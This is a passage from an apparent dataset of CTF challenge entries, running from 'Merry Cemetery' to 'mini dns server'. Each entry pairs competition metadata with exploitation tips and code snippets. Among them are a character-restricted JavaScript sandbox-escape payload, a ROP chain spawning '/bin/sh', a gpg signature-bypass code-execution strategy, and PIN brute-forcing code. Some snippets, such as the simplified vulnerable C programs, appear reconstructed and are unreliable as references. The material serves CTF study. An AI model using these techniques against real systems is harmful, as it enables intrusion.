            "For challenges requiring mass data processing or validation against a standardized set of data (such as validating legitimate words), leveraging local resources like `/usr/share/dict/words` can significantly enhance performance. This approach outpaces online APIs due to the lack of network latency and request processing time.",
            "When faced with challenges that require filtering or classifying data based on certain criteria (real vs. fake words, in this context), using Python dictionaries or sets for item storage and lambda functions for condition-specific processing can streamline the solution. The use of sets facilitates faster lookup times due to their implementation, which is ideal for existence checks within a large dataset. This approach is universally applicable for challenges involving data classification, sorting, or filtering tasks. \n   \n   Example usage in classification tasks:\n   ```python\n   # Filtering non-existent words from a given list\n   def get_fake_list(word_list):\n       return list(filter(lambda word: word not in dic_list, word_list.split(\" \")))\n   \n   # Filtering existent (real) words from a given list\n   def get_real_list(word_list):\n       return list(filter(lambda word: word in dic_list, word_list.split(\" \")))\n   ```"
        ],
        "key": "```python\ndef get_fake_list(wl):  \n   return list(filter(lambda w: w not in dic_list, wl.split(\" \")))\n\ndef get_real_list(wl):  \n   return list(filter(lambda w: w in dic_list, wl.split(\" \")))\n\nfuncs = {  \n   \": Can you tell me how many words here are NOT real words?\":  \n       lambda wl: len(get_fake_list(wl)),  \n   \": Can you tell me which words here are NOT real words IN CHRONOLOGICAL ORDER? Separate each by a space.\":  \n       lambda wl: \" \".join(get_fake_list(wl)),  \n   \": Can you tell me which words here are NOT real words IN ALPHABETICAL ORDER? Separate each by a space.\":  \n       lambda wl: \" \".join(sorted(get_fake_list(wl))),  \n   \": Can you tell me how many words here ARE real words?\":  \n       lambda wl: len(get_real_list(wl)),  \n   \": Can you tell me which words here ARE real words IN CHRONOLOGICAL ORDER? Separate each by a space.\":  \n       lambda wl: \" \".join(get_real_list(wl)),  \n   \": Can you tell me which words here ARE real words IN ALPHABETICAL ORDER? Separate each by a space.\":  \n       lambda wl: \" \".join(sorted(get_real_list(wl))),  \n}\n```"
    },
    {
        "name": "Merry Cemetery",
        "write_up": "dataset/raw/Merry Cemetery.md",
        "type": "reverse",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "In WebAssembly based CTF challenges, if the task involves interacting with JavaScript variables or the web environment, one may need to reverse engineer the WebAssembly (WASM) code to understand its interaction with JavaScript. Tools such as those converting `wasm` to a more readable format (e.g., Rust or C) can facilitate the analysis. This reverse engineering step is crucial for finding vulnerabilities or actions (e.g., incrementing variables, conditional checks) that could be exploited to affect the web environment or leak JavaScript variable contents.",
            "In challenges requiring the bypassing of character restrictions in JavaScript code execution, utilizing JavaScript's ability to interpret octal escapes (`\\141` for `a`) can enable the crafting of payloads with restricted character sets. Additionally, accessing the `Function` constructor (e.g., through `\"\".constructor.constructor`) allows for dynamic execution of arbitrary JavaScript code, which can be leveraged to execute code that wouldn't be directly allowed by the challenge's restrictions. This approach can be used to escape sandboxed environments, trigger unintended actions, or leak sensitive information, such as flags.\n\nExample Payload: \n```javascript\n_=aaaa;  \n$='\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162';  \n''[$][$]('\\164\\150\\162\\157\\167 _')()\n```"
        ],
        "key": "```rust  \nif var_18 == 7 { // +  \n   var_2 = load_8s<i32>(var_14 + 24);  \n   var_19 = load_8s<i32>(var_14 + 24);  \n   var_3 = func_62(var_19);\n\n   if var_3 == 1 {  \n       var_20 = load_8s<i32>(var_14 + 24);  \n       var_7 = var_20 + 1 << 24 >>s 24;  \n       store_8<i32>(var_14 + 24, var_7) // var24++\n\n       var_8 = load_8s<i32>(var_14 + 24);  \n       var_9 = load_8s<i32>(var_14 + 24) & 255;  \n       if var_9 == 255 {  \n           store<i32>(var_14 + 24, -1)  \n       }  \n   }  \n}  \n```\n\n```rust  \nif var_18 == 0 { // $  \n   var_23 = load_8s<i32>(var_14 + 24) & 255;  \n   if var_23 == 255 { // var24 == 255 ?  \n       var_24 = var_14 + 25;  \n       func_165(2, var_24, 1);  \n       var_25 = load_8s<i32>(var_14 + 25) & 255;  \n       func_65(var_25);  \n       env._exit(0);  \n   }  \n   else { // error  \n       var_26 = func_57(23724, 15016);  \n       var_27 = var_26;  \n       var_28 = 331;  \n       indirect_call((var_28 & 511) + 0)(var_27);  \n       env._exit(0);  \n   }  \n   return 0;  \n}  \n```\n\n```rust  \nvar_13 = 0;  \nwhile true {  \n   if var_13 ~~(18144 + var_13); // char[i]  \n   var_16 = var_15 << 24 >>s 24 >=s 98;  \n   if var_16 {  \n       var_1 = var_13;  \n       var_2 = 18144 + var_13;  \n       var_3 = load_8s<i32>(18144 + var_13);  \n       var_17 = load_8s<i32>(18144 + var_13);  \n       var_4 = var_17 << 24 >>s 24;  \n       var_5 = var_17 << 24 >>s 24 <=s 122; // 'b' <= char[i] <= 'z'  \n       if var_5 {  \n           var_14 = 7; // bad  \n           break;  \n       }  \n   }~~\n\n   var_18 = load_8s<i32>(18144 + var_13); // char[i]  \n   var_19 = var_18 << 24 >>s 24 >=s 65;  \n   if var_19 {  \n       var_6 = var_13;  \n       var_7 = 18144 + var_13;  \n       var_8 = load_8s<i32>(18144 + var_13);  \n       var_20 = load_8s<i32>(18144 + var_13);  \n       var_9 = var_20 << 24 >>s 24;  \n       var_10 = var_20 << 24 >>s 24 <=s 90; // 'A' <= char[i] <= 'Z'  \n       if var_10 {  \n           var_14 = 7; // bad  \n           break;  \n       }  \n   }  \n   var_13 += 1;  \n}\n\nif var_14 == 7 {  \n   global_10 = var_11;  \n   return 0;  \n}  \nif var_14 == 9 {  \n   global_10 = var_11;  \n   return 1;  \n}  \nreturn 0;  \n```"
    },
    {
        "name": "microscopic",
        "write_up": "dataset/raw/microscopic.md",
        "type": "reverse",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": 488,
        "max_score": 500,
        "difficulty": 0.976,
        "knowledge": [
            "When analyzing an executable with unknown behaviors, decompilation tools like Ghidra are invaluable for initial analysis to understand the functionality and logic within different parts of the code. This includes identifying function calls, variable operations, and control flow which can provide clues on how the executable processes input and what conditions need to be met for specific outcomes like retrieving a flag.",
            "For dynamic analysis and debugging of executables that use ptrace or similar anti-debugging techniques, tools like radare2 can be used to manually inspect and modify the execution flow. This includes jumping to specific functions, modifying register values, and stepping through execution to observe changes in program state. This is particularly useful in situations where the goal is to force the program into a specific state or function that reveals a flag or demonstrates a vulnerability. For example, setting the instruction pointer (`rip`) to the address of a function of interest to force its execution.\n   - Sample of modifying the instruction pointer in radare2: `dr rip=<address>`"
        ],
        "key": "```c\nvoid FUN_00100f7c(uint param_1)\n\n{  \n bool bVar1;  \n char *pcVar2;  \n long lVar3;  \n undefined8 *puVar4;  \n long in_FS_OFFSET;  \n undefined8 local_3a8 [10];  \n ulong local_358;  \n undefined8 local_348;  \n undefined8 local_340;  \n undefined8 local_338;  \n long local_328;  \n char local_12;  \n char local_11;  \n long local_10;  \n  \n local_10 = *(long *)(in_FS_OFFSET + 0x28);  \n bVar1 = false;  \n lVar3 = 0x72;  \n puVar4 = local_3a8;  \n while( true ) {  \n   if (lVar3 == 0) break;  \n   lVar3 = lVar3 + -1;  \n   *puVar4 = 0;  \n   puVar4 = puVar4 + 1;  \n }  \n ptrace(PTRACE_GETREGS,(ulong)param_1,0,local_3a8);  \n lVar3 = ptrace(PTRACE_PEEKDATA,(ulong)param_1,local_328);  \n local_12 = (char)lVar3;  \n local_11 = (char)((ulong)lVar3 >> 8);  \n if ((local_12 == '\\x0f') && (local_11 == '\\v')) {  \n   lVar3 = (long)(int)local_358;  \n   if (lVar3 == 2) {  \n     local_348 = size();  \n     bVar1 = true;  \n   }  \n   else {  \n     if (lVar3 == 3) {  \n       pcVar2 = (char *)operator[]((basic_string<char,std--char_traits<char>,std--allocator<char>>  \n                                    *)&DAT_00302300,(long)(int)local_338);  \n       *(uint *)(&DAT_00302320 + (long)(int)local_338 * 4) =  \n            ((int)*pcVar2 ^ (uint)local_340) + (int)local_338;  \n       bVar1 = true;  \n     }  \n     else {  \n       if (lVar3 == 4) {  \n         local_358 = (ulong)(*(int *)(&DAT_00302320 + (long)(int)local_338 * 4) !=  \n                            *(int *)(&DAT_00302020 + (long)(int)local_338 * 4));  \n         bVar1 = true;  \n       }  \n     }  \n   }  \n   if (!bVar1) {  \n     (**(code **)(&DAT_003024c0 + lVar3 * 8))();  \n   }  \n   local_328 = local_328 + 2;  \n   ptrace(PTRACE_SETREGS,(ulong)param_1,0,local_3a8);  \n }  \n if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "Microscopium",
        "write_up": "dataset/raw/Microscopium.md",
        "type": "crypto",
        "competition": [
            "NahamCon/2021",
            "https://ctftime.org/event/1281/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with encrypted data in an APK (Android Package Kit) and having access to the part of the code that performs the encryption, it's feasible to reverse-engineer the encryption process to decrypt the data. If the encryption is XOR-based, one can use the property `a = b ^ c <=> b = a ^ c`, where `a` is the encrypted data, `b` is the plaintext, and `c` is the encryption key. This approach is directly applicable when the encrypted data (cipher), partial key, and method of key derivation (e.g., appending a pin to a partial static key and using SHA-256 hashing) are known.\n   - Sample of the decryption process:\n     ```javascript\n     function decode(pin) {\n       const cipher64 = \"EncryptedDataInBase64==\";\n       const partKey = \"staticPartOfKey\" + pin;\n       const cipherBuff = Buffer.from(cipher64, 'base64');\n       const keyBuff = crypto.createHash('sha256').update(partKey).digest();\n       let output = \"\";\n       for (let i = 0; i < cipherBuff.length; i++) {\n         output += String.fromCharCode(cipherBuff[i] ^ keyBuff[i % keyBuff.length]);\n       }\n       return output;\n     }\n     ```",
            "For brute-forcing a pin or password protecting encrypted data, instead of manually iterating over all possible combinations, leveraging node.js's `crypto` module significantly simplifies the process. This method is more efficient and streamlined, particularly when dealing with typical cryptographic functions and operations. It's beneficial in scenarios where the cryptographic operation relies on common hashing algorithms like SHA-256 or encryption standards that are supported by the `crypto` module. \n   - Example usage of the `crypto` module for brute-forcing:\n     ```javascript\n     const crypto = require(\"crypto\");\n\n     function findPin(padBase64, partKey) {\n       const pad = Buffer.from(padBase64, \"base64\");\n       for (let i = 0; i <= 9999; i++) {\n         const pin = i.toString().padStart(4, '0');\n         const hash = crypto.createHash(\"sha256\").update(partKey + pin).digest();\n         let decrypted = \"\";\n         for (let j = 0; j < pad.length; j++) {\n           decrypted += String.fromCharCode(pad[j] ^ hash[j % hash.length]);\n         }\n         if (decrypted.includes(\"flag\")) {\n           console.log(`PIN: ${pin}`);\n           console.log(decrypted);\n           break;\n         }\n       }\n     }\n     ```"
        ],
        "key": "```javascript\nfunction b() {  \n var t;  \n (0, o.default)(this, b);  \n for (var n = arguments.length, l = new Array(n), u = 0; u < n; u++) l[u] =\narguments[u];  \n return (t = v.call.apply(v, [this].concat(l))).state = {  \n   output: 'Insert the pin to get the flag',  \n   text: ''  \n }, t.partKey = \"pgJ2K9PMJFHqzMnqEgL\", t.cipher64 =\n\"AA9VAhkGBwNWDQcCBwMJB1ZWVlZRVAENW1RSAwAEAVsDVlIAV00=\", t.onChangeText =\nfunction(n) {  \n   t.setState({  \n     text: n  \n   })  \n }, t.onPress = function() {  \n   var n = p.Base64.toUint8Array(t.cipher64),  \n     o = y.sha256.create();  \n   o.update(t.partKey), o.update(t.state.text);  \n   for (var l = o.hex(), u = \"\", c = 0; c < n.length; c++) u +=\nString.fromCharCode(n[c] ^ l.charCodeAt(c));  \n   t.setState({  \n     output: u  \n   })  \n }, t  \n}  \n```"
    },
    {
        "name": "military-crypto",
        "write_up": "dataset/raw/military-crypto.md",
        "type": "crypto",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 430,
        "max_score": 500,
        "difficulty": 0.86,
        "knowledge": [
            "When facing challenges that involve uploading and verifying firmware or files with detached signatures, it's useful to understand that tools like `gpg` can verify both signed files (where the content and signature are both in one file) and files with detached signatures (where the content and signature are in separate files). Under certain conditions, providing a signed file instead of a separate signature file can trick the verification process into ignoring the intended content file. This knowledge is crucial when the verification process does not explicitly specify the data file to `gpg`, allowing for the verification of an unintended file.  \nExample exploit strategy: If a service uses `gpg --verify` without specifying the data file explicitly, an attacker can upload a self-contained signed message as a \"signature\" to bypass the verification process intended for a separate data and signature file setup.",
            "In scenarios where you have control over the content being verified and the verification process does not enforce strict checking of file integrity beyond signature validation, submitting a malicious executable script (e.g., a shell script launching `/bin/bash`) as the content file, paired with a valid signed message as the \"signature,\" can lead to arbitrary code execution on the target system. This approach capitalizes on the verification tool's behavior of treating a single input as a self-verifying signed message, thus neglecting the actual content file intended for verification.  \nExample payload: A bash script that contains `#!/bin/bash` followed by arbitrary commands, submitted as the firmware update file with a signed message (which passes `gpg` verification) acting as the detached signature."
        ],
        "key": "```sh  \nupdate_firmware() {  \n  cat <<EOF  \n====================================================  \n   1) send update binary as base64  \n   2) finish with an empty line  \n   3) send detached signature as base64  \n   4) finish with an empty line  \n====================================================  \nEOF  \n  echo 'Reading firmware...'  \n  touch update.bin.b64  \n  while IFS='' read -r firmware; do  \n      if [ -z \"$firmware\" ]; then break; fi  \n      echo \"$firmware\" >> update.bin.b64  \n  done  \n  base64 -d update.bin.b64 > update.bin  \n  rm update.bin.b64\n\n  echo 'Reading detatched signaure...'  \n  touch update.bin.sig  \n  while IFS='' read -r signature; do  \n      if [ -z \"$signature\" ]; then break; fi  \n      echo \"$signature\" >> update.bin.sig.b64  \n  done  \n  base64 -d update.bin.sig.b64 > update.bin.sig  \n  rm update.bin.sig.b64\n\n  if ! gpg --verify update.bin.sig; then  \n      set +x  \n      echo '!!!!!!!!!!!!!!!!!!!!!!!'  \n      echo '!! INVALID SIGNATURE !!'  \n      echo '!!!!!!!!!!!!!!!!!!!!!!!'  \n      exit 1  \n  else  \n      chmod +x update.bin  \n      echo 'Updating....'  \n      ./update.bin  \n      echo 'Rebooting....'  \n      exit 0  \n  fi  \n}  \n```"
    },
    {
        "name": "Mind Space",
        "write_up": "dataset/raw/Mind Space.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 287,
        "max_score": 500,
        "difficulty": 0.574,
        "knowledge": [
            "When designing a brute-force attack for a challenge requiring numeric string cracking, efficiently narrowing down the brute-force range is key. Numeric strings can often be brute-forced with a small range if their properties are analyzed correctly. Utilizing conditions inside the verification function can significantly reduce the brute-force space. For instance, conditions on numeric value length, specific digits at certain positions, or mathematical operations that the input must satisfy can guide the construction of a more efficient brute-force algorithm.",
            "In challenges involving format string vulnerabilities, payload crafting can bypass protections like canaries by exploiting weaknesses in functions like `scanf`. If a function behaves unexpectedly with certain inputs (e.g., returning a negative value without altering memory where a pointer points), this behavior can be leveraged to craft payloads that maintain stack integrity while still overwriting critical memory locations. A practical exploit technique involves providing inputs that the vulnerable function does not process (e.g., a \"-\" for `scanf` expecting a floating point number), thereby avoiding altering memory locations like canaries and facilitating a buffer overflow attack without triggering built-in protections.\n   \nExample payload: Use `\"-\"` for each expected number input until the overflow portion of the payload is reached, then follow with numbers encoding the ROP chain or shellcode pointer addresses, bypassing the canary check."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <stdbool.h>\n\nbool sub_40140A(char *secret)  \n{  \n size_t v1; // r12  \n size_t v2; // r12  \n bool ret; // al  \n int v4; // [rsp+1Ch] [rbp-34h]  \n int v5; // [rsp+34h] [rbp-1Ch]  \n int v6; // [rsp+38h] [rbp-18h]  \n int sint; // [rsp+3Ch] [rbp-14h]\n\n sint = strtol(secret, 0LL, 10);  \n ret = 0;  \n if ( sint % (strlen(secret) + 2) || secret[4] != '1' )  \n   return ret;  \n v6 = sint / 100000;  \n v5 = sint % 10000;  \n if ( 10 * (sint % 10000 / 1000) + sint % 10000 % 100 / 10 - (10 * (sint /\n100000 / 1000) + sint / 100000 % 10) != 1  \n   || 10 * (v6 / 100 % 10) + v6 / 10 % 10 - 2 * (10 * (v5 % 100 / 10) + v5 %\n1000 / 100) != 8 )  \n {  \n   return ret;  \n }  \n v4 = 10 * (v5 / 100 % 10) + v5 % 10;  \n if ( (10 * (v6 % 10) + v6 / 100 % 10) / v4 != 3 || (10 * (v6 % 10) + v6 / 100\n% 10) % v4 )  \n   return ret;  \n v1 = strlen(secret) + 2;  \n v2 = (strlen(secret) + 2) * v1;  \n if ( sint % (v5 * v6) == v2 * (strlen(secret) + 2) + 6 )  \n   ret = 1;  \n return ret;  \n}\n\nchar buf[0x100];\n\nint main(int argc, char const *argv[])  \n{  \n for (size_t i = 0; i < 0x100000000; ++i)  \n {  \n   snprintf(buf, sizeof(buf), \"%d\", (int)i);  \n   if (sub_40140A(buf))  \n     puts(buf);//790317143  \n }  \n return 0;  \n}  \n```\n\n```c\n#include <stdio.h>  \n#include <dlfcn.h>  \n#include <memory.h>  \ntypedef int (*func_t)(char *);  \nchar buf[0x100];  \nchar key[0x100];\n\n//to clear the stack of verification function,  \n//because use of `strncpy` will cause uninitialized variable access (no null\nterminate)  \n//which causes unexpected results if `strcat` is called to that string later  \nvoid clear_stack()  \n{  \n\tchar buf[0x1000];  \n\tmemset(buf, 0, sizeof(buf));  \n}\n\nint main(int argc, char const *argv[])  \n{  \n\tchar* addr = *(char**)dlopen(\"./silkroad_2.elf\", RTLD_NOW | RTLD_GLOBAL);  \n\tfunc_t f = (func_t)(addr + 0x1C06);  \n\tfor (int i = 0; i < 0x3b9aca00; ++i)  \n\t{  \n\t\tsprintf(buf, \"%.9d\", i);  \n\t\tfor (int i = 0; i < 4; ++i)  \n\t\t{  \n\t\t\tkey[i] = buf[i];  \n\t\t}  \n\t\tfor (int i = 0; i < 5; ++i)  \n\t\t{  \n\t\t\tkey[6 + i] = buf[4 + i];  \n\t\t}  \n\t\tkey[4] = '1';  \n\t\tkey[5] = '1';//4,5 must be length, which is always 11  \n\t\tkey[11] = 0;  \n\t\tclear_stack();  \n\t\tif (f(key) == 1)  \n\t\t\tputs(buf);  \n\t}  \n\treturn 0;  \n}  \n```\n\n```c\nsigned __int64 __fastcall sub_1FCA(char *input)  \n{  \n int v1; // eax  \n int v2; // ST1C_4  \n unsigned __int64 v3; // rbx  \n size_t v4; // r12  \n size_t v5; // r12  \n char v6; // bl  \n int v7; // ebx  \n int v8; // ebx  \n size_t v9; // rax  \n signed __int64 result; // rax  \n signed int i; // [rsp+14h] [rbp-4Ch]  \n signed int j; // [rsp+14h] [rbp-4Ch]  \n signed int k; // [rsp+14h] [rbp-4Ch]  \n signed int l; // [rsp+14h] [rbp-4Ch]  \n char _1337[5]; // [rsp+22h] [rbp-3Eh]  \n char v16[6]; // [rsp+27h] [rbp-39h]  \n char v17[6]; // [rsp+2Dh] [rbp-33h]  \n char haystack[6]; // [rsp+33h] [rbp-2Dh]  \n char v19[15]; // [rsp+39h] [rbp-27h]  \n unsigned __int64 v20; // [rsp+48h] [rbp-18h]\n\n v20 = __readfsqword(0x28u);  \n haystack[5] = 0;  \n for ( i = 0; i <= 4; ++i )  \n   haystack[i] = input[strlen(input) - 5 + i];  \n if ( !strstr(haystack, \"1337\") )              // 14:19  \n   goto LABEL_23; //must contain 1337, and be either X1337 or 1337X  \n v1 = strtol(haystack, 0LL, 10);  \n v2 = 100 * (input[13] - '0') + 1000 * (input[6] - '0') + input[15] - '0';  \n v3 = v1;  \n v4 = strlen(input);  \n v5 = strlen(input) * v4;  \n if ( v3 % (strlen(input) * v5) != v2 )  \n   goto LABEL_23;// 1337XorX1337 % len**3 must have ten digit being 0  \n for ( j = 0; j <= 4; ++j )  \n {  \n   v16[j] = input[j];  \n   v17[j] = input[strlen(input) - 10 + j];  \n }  \n v16[5] = 0;  \n v17[5] = 0;  \n for ( k = 0; k <= 14; ++k )  \n   v19[k] = input[k];  \n v19[14] = 0;  \n for ( l = 0; l <= 3; ++l )  \n   _1337[l] = haystack[l + 1];  \n _1337[4] = 0;  \n if ( strstr(v19, _1337)  \n   && (v6 = *input, v6 == input[strlen(input) - 8])// [0] == [11]  \n   && (v7 = input[strlen(input) - 2] - 48,  \n       v8 = input[strlen(input) - 3]  \n          - 48                                 // [17] + [16] + [15] + 1 == [1]  \n          + v7,  \n       v8 + input[strlen(input) - 4] - 48 + 1 == input[1] - 48)  \n   && (v9 = strlen(input), v9 == 19 * ((unsigned __int64)(0xD79435E50D79435FLL\n* (unsigned __int128)v9 >> 64) >> 4)) ) // len must == 19  \n {  \n   result = 1LL;  \n }  \n else  \n {  \nLABEL_23:  \n   result = 0xFFFFFFFFLL;  \n }  \n return result;  \n}  \n```"
    },
    {
        "name": "Mindgames 1338",
        "write_up": "dataset/raw/Mindgames 1338.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 470,
        "max_score": 497,
        "difficulty": 0.9456740442655935,
        "knowledge": [
            "When dealing with stack canaries in a binary exploitation challenge, it is essential to leak the canary value before attempting to overwrite the control flow. This can be achieved by finding a way to read arbitrary memory contents, such as using an out-of-bounds read vulnerability or, as seen in the challenge, leaking memory addresses consecutively till reaching the canary's location. The key takeaway is to use a visible pointer in memory that can lead to the stack canary's location, for instance, libc's `environ` variable, which stores a pointer to the stack.",
            "After bypassing stack canaries and PIE (Position Independent Execution), using Return-Oriented Programming (ROP) to chain gadgets for arbitrary code execution is a viable technique. The process involves:\n   - Leaking necessary addresses such as libc base and PIE base to calculate offsets dynamically.\n   - Finding and utilizing ROP gadgets to control the flow of execution, for example, `POPRDI` to set up the argument for a function call.\n   - Calling system functions such as `system(\"/bin/sh\")` to spawn a shell by carefully crafting the payload with appropriate gadgets and function addresses based on the leaked addresses.\n\nExample Payload Part for ROP:\n```\n$payload  = str_repeat(\"x\", 0x108);\n$payload .= pack(\"Q\", $canary); // Overwrite the canary value leaked earlier\n$payload .= pack(\"Q\", 0xdeadbeef); // Placeholder for the base pointer (rbp)\n$payload .= pack(\"Q*\",\n    $libc + POPRDI, $libc + BINSH, // Set first argument of 'system' to '/bin/sh'\n    $base + PUTS, // Return address placeholder, could be used for further leaks\n\n    $libc + POPRDI, $libc + BINSH, // Setup for calling 'system(\"/bin/sh\")'\n    $libc + SYSTEM, // Address of 'system'\n\n    -1 // End of ROP chain\n);\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid play_game() {\n    char name[32];\n    int score = 0;\n    int guess;\n    int secret_number = rand() % 100;\n\n    printf(\"Can you guess my number?\\n\");\n    while (1) {\n        printf(\"> \");\n        scanf(\"%d\", &guess);\n        if (guess == secret_number) {\n            printf(\"You guessed it!\\n\");\n            score++;\n            break;\n        } else {\n            printf(\"Try again!\\n\");\n        }\n    }\n\n    printf(\"Game over! Your score: %d\\n\", score);\n    printf(\"Give me your name: \");\n    scanf(\"%s\", name); // Vulnerable to buffer overflow\n    printf(\"New Highscore! Amazing!\\n\");\n}\n\nint main() {\n    srand(time(NULL));\n    printf(\"Welcome to the guessing game!\\n\");\n    play_game();\n    return 0;\n}\n```"
    },
    {
        "name": "Mine Sweeping",
        "write_up": "dataset/raw/Mine Sweeping.md",
        "type": "misc",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 84,
        "max_score": 952,
        "difficulty": 0.08823529411764706,
        "knowledge": [
            "When dealing with software or games that involve random elements or game states saved between sessions, tracking and recording state changes such as the positions of elements (like mines in a mine sweeping game) can be a viable strategy. This can be accomplished through manual logging of state changes or using automation to capture state changes over time. This approach relies on the assumption that certain elements of the state (like the configuration of mines) do not change between sessions, allowing for a mapping of the terrain or state space with enough time and effort.",
            "Reverse engineering and dynamic analysis of software can reveal underlying data structures and state information, such as global arrays used to determine game states or element positions. Manipulating these directly through memory editing or modifying the source code (if available) can alter the game state to achieve a desired outcome, such as triggering a win condition directly. This is particularly effective in cases where the software's logic or state determinants are not obfuscated or are easily understandable upon inspection. For instance, identifying the conditions for win or lose scenarios in a game's code and altering them to force a winning scenario regardless of the actual game state."
        ],
        "key": "```csharp\nvoid Awake()  \n{  \n    int x = (int)transform.position.x;  \n    int y = (int)transform.position.y;  \n    //According to the global array to set whether the grid is mine or open space  \n    bIsMine = (((MayWorldBeAtPeace[x, y] ^ AreYouFerryMen[x, y]) - 233) / 2333) == 1 ? true : false;  \n    //Bind the object instance to the grid according to the position of the grid  \n    Grids._instance.eleGrids[(int)transform.position.x, (int)transform.position.y] = this;  \n    //The corresponding grid value setting in the grid  \n    Grids._instance.DevilsInHeaven[(int)transform.position.x, (int)transform.position.y] = (bIsMine == true ? 1 : 0);  \n    //Hide the reset button  \n    resetButton = GameObject.FindGameObjectWithTag(\"resetButton\");  \n    if (resetButton)  \n        resetButton.SetActive(false);  \n}\n```"
    },
    {
        "name": "Mine The Gap",
        "write_up": "dataset/raw/Mine The Gap.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": -1,
        "max_score": 320,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving complex puzzles or simulations (like Minesweeper) that resemble logical systems, transforming the game's problem into an equivalent computational problem (in this case, SAT - Boolean satisfiability problem) can make it solvable using computational tools. Specifically, logic circuits or patterns within the puzzle can be represented and solved using SAT solvers such as **z3** or custom solvers designed for that logic structure.",
            "When designing a solution for converting puzzles into satisfiability problems, the puzzle need to be encoded in a way that a SAT solver can process. This includes translating the game elements into variables (e.g., board cells as variables), formulating constraints (e.g., mines near a cell), and then inputting these constraints in a format compatible with the SAT solver (e.g., DIMACS for CNF - Conjunctive Normal Form). An efficient encoding is critical for the solver\u2019s performance and the feasibility of finding a solution within a reasonable time.\n\n   Example encoding step for a cell with unknown neighbors:\n   ```python\n   def unknown_neighbours(board, i, j):\n       neighbors = []\n       for h in range(i-1, i+2):\n           for w in range(j-1, j+2):\n               # board[h][w]>8 checks for unknown or mine cells\n               if 0 <= h < len(board) and 0 <= w < len(board[0]) and board[h][w] > 8:\n                   neighbors.append((h, w))\n       return neighbors\n   ```"
        ],
        "key": "```python\n# find unknown cells next to a cell at i,j  \ndef unknown_neighbours(board,i,j):  \n neighbours=[]  \n for h in range(i-1,i+2):  \n   for w in range(j-1,j+2):  \n     if h<len(board) and w<len(board[0]) and h>=0 and w>=0 and (board[h][w]>8): neighbours.append((h,w))  \n return neighbours\n```"
    },
    {
        "name": "Minesweeper",
        "write_up": "dataset/raw/Minesweeper.md",
        "type": "misc",
        "competition": [
            "CSAW/2017/Quals",
            "https://ctftime.org/event/488/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing or reverse-engineering a binary program that is suspected to be compressed or packed, especially if it's a challenge related to binary exploitation, it is valuable to check for and unpack the binary first. This is because packing or compressing binaries is a technique often used to obfuscate code, making analysis difficult. Tools like UPX can be used to unpack these executables. Upon unpacking, one can use tools like `checksec` to inspect the security properties of the binary, such as stack canaries, NX bit, PIE, and RELRO.",
            "In scenarios involving heap-based vulnerabilities, particularly when the challenge involves arbitrary-size allocations or buffer overflows, one can exploit out-of-bounds write vulnerabilities to achieve arbitrary code execution. Key steps \ninvolve understanding the vulnerable binary's behavior around heap allocations and identifying how input affects heap state. Strategies include:  \n    - Leaking memory addresses (stack, heap, libc) to defeat ASLR. This can be achieved by manipulating the program to disclose memory contents, e.g., uninitialized heap memory or improperly handled outputs.\n    - Calculating offsets to critical structures or return addresses based on leaked addresses.\n    - Crafting payloads to overwrite function pointers, return addresses, or similar control structures with addresses of injected shellcode or existing gadgets in the binary (ROP).\n    - Considering the executable's security mechanisms (e.g., NX, PIE) to plan the payload. For instance, if NX is disabled and the heap is executable (RWX), one can directly inject and execute shellcode on the heap.\n\nSample payload (conceptual, specifics depend on the binary's layout and vulnerabilities): \n```python\npayload = 'A'*offset + p32(heap_shellcode_addr) + shellcode\n```\nThis payload pattern assumes an overflow allowing control of a saved return address, where `heap_shellcode_addr` is the address of the injected shellcode on the heap crafted based on a leaked heap address, and `shellcode` is the attacker's code to be executed."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid initialize_game() {\n    int x, y, size;\n    char buffer[81]; // Incorrect buffer size allocation\n\n    printf(\"Please enter in the dimensions of the board you would like to set in this format: B X Y\\n\");\n    scanf(\"B %d %d\", &x, &y);\n\n    size = x * y;\n    printf(\"Allocated buffer of size: %d\\n\", size);\n\n    // Vulnerability: buffer overflow due to incorrect size allocation\n    if (size > 81) {\n        printf(\"Error: Buffer overflow detected!\\n\");\n        exit(1);\n    }\n\n    // Simulate reading input into buffer\n    printf(\"Enter your input: \");\n    scanf(\"%s\", buffer);\n}\n\nint main() {\n    char option;\n    printf(\"Hi. Welcome to Minesweeper. Please select an option:\\n\");\n    printf(\"1) N (New Game)\\n\");\n    printf(\"2) Initialize Game(I)\\n\");\n    printf(\"3) Q (Quit)\\n\");\n\n    while (1) {\n        scanf(\" %c\", &option);\n        if (option == 'I') {\n            initialize_game();\n        } else if (option == 'Q') {\n            break;\n        }\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "mini dns server",
        "write_up": "dataset/raw/mini dns server.md",
        "type": "reverse",
        "competition": [
            "DownUnderCTF/2023",
            "https://ctftime.org/event/1954/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
